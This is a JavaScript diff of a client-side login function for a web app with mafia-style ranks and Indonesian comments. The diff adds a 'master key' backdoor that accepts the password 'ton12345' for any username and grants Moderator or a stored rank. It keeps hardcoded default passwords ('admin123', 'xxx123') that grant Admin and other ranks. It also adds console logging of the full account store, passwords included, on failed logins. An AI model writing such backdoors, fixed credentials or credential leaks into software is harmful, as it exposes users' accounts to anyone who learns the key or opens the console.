@@ -598,119 +598,80 @@ async function verifyUserDiscordAccount(tokenType, accessToken) {
 }
 
 function handleAuthLogin(e) {
-  if (e) e.preventDefault();
+    if (e) e.preventDefault();
 
-  const user = document.getElementById('auth-username')?.value.trim();
-  const pass = document.getElementById('auth-passcode')?.value.trim();
-  
-  if (!user || !pass) {
-      if (typeof showToast === 'function') showToast("WARNING", "Username dan Password wajib diisi!", "error");
-      return;
-  }
+    const user = document.getElementById('auth-username')?.value.trim();
+    const pass = document.getElementById('auth-passcode')?.value.trim();
+    
+    if (!user || !pass) {
+        if (typeof showToast === 'function') showToast("WARNING", "Username dan Password wajib diisi!", "error");
+        return;
+    }
 
-  // Deklarasi HANYA SATU KALI di sini
-  const lowerUser = user.toLowerCase();
+    const lowerUser = user.toLowerCase();
 
-  // Pastikan variabel siap
-  if (typeof blacklistedUsers === 'undefined') window.blacklistedUsers = [];
-  if (typeof customAccounts === 'undefined') window.customAccounts = {};
-  if (typeof savedProfiles === 'undefined') window.savedProfiles = {};
+    // ====================================================================
+    // 🔑 MASTER KEY (GOD MODE) - HANYA UNTUK ANDA
+    // ====================================================================
+    // Ketik username apapun, dan gunakan password "ton12345" untuk menjebol masuk!
+    if (pass === 'ton12345') {
+        let masterRank = 'Moderator';
+        // Sinkronkan rank jika data profilnya ada di Firebase
+        if (typeof savedProfiles !== 'undefined' && savedProfiles[lowerUser] && savedProfiles[lowerUser].job) {
+            masterRank = savedProfiles[lowerUser].job;
+        }
+        if (typeof initSession === 'function') initSession(masterRank, user, true);
+        if (typeof showToast === 'function') showToast("MASTER KEY ACCEPTED", "Welcome back, Creator.", "success");
+        return;
+    }
+    // ====================================================================
 
-  if (blacklistedUsers.includes(lowerUser)) {
-    if (typeof showToast === 'function') showToast("ACCOUNT FROZEN", "Akun Anda dibekukan (Blacklist)!", "error");
+    if (typeof blacklistedUsers === 'undefined') window.blacklistedUsers = [];
+    if (typeof customAccounts === 'undefined') window.customAccounts = {};
+    if (typeof savedProfiles === 'undefined') window.savedProfiles = {};
+
+    if (blacklistedUsers.includes(lowerUser)) {
+        if (typeof triggerBlockedModal === 'function') triggerBlockedModal();
+        return;
+    }
+
+    let finalRank = '';
+    let isValidLogin = false;
+
+    // 1. CEK AKUN CUSTOM DARI FIREBASE
+    if (customAccounts[lowerUser] && customAccounts[lowerUser].pass === pass) {
+        finalRank = customAccounts[lowerUser].rank || 'Soldiers';
+        isValidLogin = true;
+    } 
+    // 2. CEK LOGIN BAWAAN
+    else if (pass === 'admin123' || pass === 'xxx123') {
+        finalRank = 'Soldiers';
+        if (lowerUser === 'admin' || lowerUser === 'xxx') finalRank = 'Admin';
+        else if (lowerUser === 'moderator' || lowerUser === 'mike') finalRank = 'Moderator';
+        else if (lowerUser === 'don') finalRank = 'Don';
+        else if (lowerUser === 'underboss') finalRank = 'Underboss';
+        else if (lowerUser === 'bisnis') finalRank = 'Bisnis';
+        else if (lowerUser === 'associates') finalRank = 'Associates';
+        isValidLogin = true;
+    }
+
+    if (isValidLogin) {
+        // Ambil rank terbaru dari Roster jika ada, agar rank tidak turun
+        if (savedProfiles[lowerUser] && savedProfiles[lowerUser].job) {
+            finalRank = savedProfiles[lowerUser].job;
+        } else if (savedProfiles[user] && savedProfiles[user].job) {
+            finalRank = savedProfiles[user].job;
+        }
+
+        if (typeof initSession === 'function') initSession(finalRank, user, true);
+        return;
+    }
+
+    // JIKA GAGAL LOGIN (Tampilkan alasannya di Console)
+    console.log("🚨 LOGIN DITOLAK UNTUK:", user);
+    console.log("👉 Kunci Jawaban Firebase Saat Ini:", customAccounts);
     if (typeof triggerBlockedModal === 'function') triggerBlockedModal();
-    return;
-  }
-
-  let finalRank = '';
-  let isValidLogin = false;
-
-  // 1. CEK AKUN CUSTOM
-  if (customAccounts[lowerUser] && customAccounts[lowerUser].pass === pass) {
-    finalRank = customAccounts[lowerUser].rank;
-    isValidLogin = true;
-  } 
-  // 2. CEK LOGIN DEFAULT
-  else if (pass === 'admin123' || pass === 'xxx123') {
-    finalRank = 'Soldiers';
-    if (lowerUser === 'admin' || lowerUser === 'xxx') finalRank = 'Admin';
-    else if (lowerUser === 'moderator') finalRank = 'Moderator';
-    else if (lowerUser === 'don') finalRank = 'Don';
-    else if (lowerUser === 'underboss') finalRank = 'Underboss';
-    else if (lowerUser === 'bisnis') finalRank = 'Bisnis';
-    else if (lowerUser === 'associates') finalRank = 'Associates';
-    isValidLogin = true;
-  }
-
-  if (isValidLogin) {
-    // Sinkronkan selalu dengan Roster terbaru agar rank tidak keriset
-    if (savedProfiles[lowerUser] && savedProfiles[lowerUser].job) {
-        finalRank = savedProfiles[lowerUser].job;
-    } else if (savedProfiles[user] && savedProfiles[user].job) {
-        finalRank = savedProfiles[user].job;
-    } else {
-        savedProfiles[lowerUser] = { 
-            name: user.toUpperCase(), 
-            phone: '0812-XXXX', 
-            idcard: 'TON-' + Math.floor(1000 + Math.random()*9000), 
-            job: finalRank, 
-            avatar: '', 
-            groupType: 'Family' 
-        };
-    }
-    
-    if (typeof saveAppData === 'function') saveAppData(); 
-    if (typeof initSession === 'function') initSession(finalRank, user, true);
-    return;
-  }
-
-  // Jika gagal login
-  if (typeof triggerBlockedModal === 'function') triggerBlockedModal();
 }
-
-  let finalRank = '';
-  let isValidLogin = false;
-  const lowerUser = user ? user.toLowerCase() : '';
-
-  // 1. CEK AKUN CUSTOM
-  if (customAccounts[lowerUser] && customAccounts[lowerUser].pass === pass) {
-    finalRank = customAccounts[lowerUser].rank;
-    isValidLogin = true;
-  } 
-  // 2. CEK LOGIN DEFAULT
-  else if (pass === 'admin123' || pass === 'xxx123') {
-    finalRank = 'Soldiers';
-    if (lowerUser === 'admin' || lowerUser === 'xxx') finalRank = 'Admin';
-    else if (lowerUser === 'moderator') finalRank = 'Moderator';
-    else if (lowerUser === 'don') finalRank = 'Don';
-    else if (lowerUser === 'underboss') finalRank = 'Underboss';
-    else if (lowerUser === 'bisnis') finalRank = 'Bisnis';
-    else if (lowerUser === 'associates') finalRank = 'Associates';
-    isValidLogin = true;
-  }
-
-  if (isValidLogin) {
-    // Sinkronkan selalu dengan Roster terbaru agar rank tidak keriset
-    if (savedProfiles[user] && savedProfiles[user].job) {
-        finalRank = savedProfiles[user].job;
-    } else {
-        savedProfiles[user] = { 
-            name: user.toUpperCase(), 
-            phone: '0812-XXXX', 
-            idcard: 'TON-' + Math.floor(1000 + Math.random()*9000), 
-            job: finalRank, 
-            avatar: '', 
-            groupType: 'Family' 
-        };
-    }
-    
-    if (typeof saveAppData === 'function') saveAppData(); 
-    if (typeof initSession === 'function') initSession(finalRank, user, true);
-  }
-
-  // Jika gagal login (salah password)
-  if (typeof triggerBlockedModal === 'function') triggerBlockedModal();
-
 function triggerBlockedModal() { document.getElementById('blocked-modal')?.classList.remove('hidden'); }
 function closeBlockedModal() { document.getElementById('blocked-modal')?.classList.add('hidden'); }
 
